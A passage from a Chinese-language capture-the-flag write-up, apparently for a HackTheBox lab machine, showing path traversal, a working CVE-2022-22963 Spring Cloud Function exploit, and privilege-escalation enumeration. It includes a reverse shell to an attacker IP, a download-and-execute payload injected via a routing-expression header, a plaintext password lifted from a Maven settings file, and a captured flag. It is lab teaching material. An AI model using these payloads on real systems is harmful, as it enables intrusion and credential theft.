class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">frank:x:1000:1000:frank:&#x2F;home&#x2F;frank:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:113:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">phil:x:1001:1001::&#x2F;home&#x2F;phil:&#x2F;bin&#x2F;bash</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:996::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>可以列目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
<p>WEB代码如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.WebApp.user;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> javax.activation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.StandardCopyOption;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String UPLOADED_FOLDER = <span class="string">&quot;/var/www/WebApp/src/main/uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">homePage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;homepage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">signUpFormGET</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;under&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/upload&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">UploadFormGet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/show_image&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">getImage</span><span class="params">(<span class="meta">@RequestParam(&quot;img&quot;)</span> String name)</span> </span>&#123;</span><br><span class="line">        String fileName = UPLOADED_FOLDER + name;</span><br><span class="line">        Path path = Paths.get(fileName);</span><br><span class="line">        Resource resource = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            resource = <span class="keyword">new</span> UrlResource(path.toUri());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Upload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file, Model model)</span></span>&#123;</span><br><span class="line">        String fileName = StringUtils.cleanPath(file.getOriginalFilename());</span><br><span class="line">        <span class="keyword">if</span> (!file.isEmpty() &amp;&amp; !fileName.contains(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            String mimetype = <span class="keyword">new</span> MimetypesFileTypeMap().getContentType(fileName);</span><br><span class="line">            String type = mimetype.split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (type.equals(<span class="string">&quot;image&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Path path = Paths.get(UPLOADED_FOLDER+fileName);</span><br><span class="line">                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;name&quot;</span>, fileName);</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Uploaded!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Only image files are accepted!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Please Upload a file!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/release_notes&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">changelog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;change&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blogPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>pom.xml</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>WebApp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>WebApp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">java.version</span>&gt;</span>11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.activation<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.activation<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  			<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-function-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bootstrap<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.webjars<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>webjars-locator-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;parent.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">finalName</span>&gt;</span>spring-webapp<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>spring-cloud-function-web 3.2.2存在RCE漏洞</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.zscaler.com/blogs/security-research/analysis-spring-cloud-framework-vulnerabilities">https://www.zscaler.com/blogs/security-research/analysis-spring-cloud-framework-vulnerabilities</a><br />
<a target="_blank" rel="noopener" href="https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py">https://github.com/dinosn/CVE-2022-22963/blob/main/poc.py</a></p>
</blockquote>
<p>构造EXP并触发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.10.*.*/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/BFL</span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">python -m http.server 80&amp;</span><br><span class="line">proxychains curl http://10.10.11.204:8080/functionRouter -H <span class="string">&#x27;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;curl http://10.10.*.*/BFL -o /tmp/BFL&quot;)&#x27;</span> -d <span class="string">&quot;BFL&quot;</span></span><br><span class="line">proxychains curl http://10.10.11.204:8080/functionRouter -H <span class="string">&#x27;spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash /tmp/BFL&quot;)&#x27;</span> -d <span class="string">&quot;BFL&quot;</span></span><br></pre></td></tr></table></figure>
<p>获得反弹Shell</p>
<p>得到<code>phil</code>账号信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/frank/.m2/settings.xml</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>Inject<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">username</span>&gt;</span>phil<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">password</span>&gt;</span>DocPhillovestoInject123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">privateKey</span>&gt;</span>$&#123;user.home&#125;/.ssh/id_dsa<span class="tag">&lt;/<span class="name">privateKey</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filePermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">filePermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">directoryPermissions</span>&gt;</span>660<span class="tag">&lt;/<span class="name">directoryPermissions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>切换账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su phil</span><br><span class="line">DocPhillovestoInject123</span><br></pre></td></tr></table></figure>
<p>获取tty</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>查看user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/phil/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21440ad399cf843bcf64f2f7fa9ff600</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-27"><a class="markdownIt-Anchor" href="#权限提升-27"></a> 权限提升</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;1001(phil) gid&#x3D;1001(phil) groups&#x3D;1001(phil),50(staff)</span><br></pre></td></tr></table></figure>
<p>staff组权限</p>
<p>查看staff组权限相关文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group staff -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">183353      4 drwxrwxr-x   2 root     staff        4096 Mar 20 16:02 &#x2F;opt&#x2F;automation&#x2F;tasks</span><br></pre></td></tr></table></figure>
<p>下载pspy</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<p>获取pspy并运行</p>
